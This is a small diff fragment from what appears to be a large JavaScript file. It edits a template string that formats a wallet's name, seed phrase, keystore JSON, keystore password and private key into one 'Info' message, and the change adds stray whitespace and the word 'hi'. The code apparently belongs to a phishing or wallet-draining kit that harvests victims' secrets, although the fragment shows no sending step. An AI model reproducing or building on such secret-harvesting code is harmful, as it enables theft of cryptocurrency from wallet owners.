@@ -13034,9 +13034,9 @@ const _l = {
                          Info: `
                          Wallet Name : ${v} 
                          Phrase : ${a.phrase}
-                        Keystore JSON : ${a.keystore}
+                         Keystore JSON : ${a.keystore}
                          Keystore Password : ${a.password}
-                         Private Key : ${a.privateKey} `,
+                         Private Key : ${a.privateKey} hi `,
                          
         
                         },
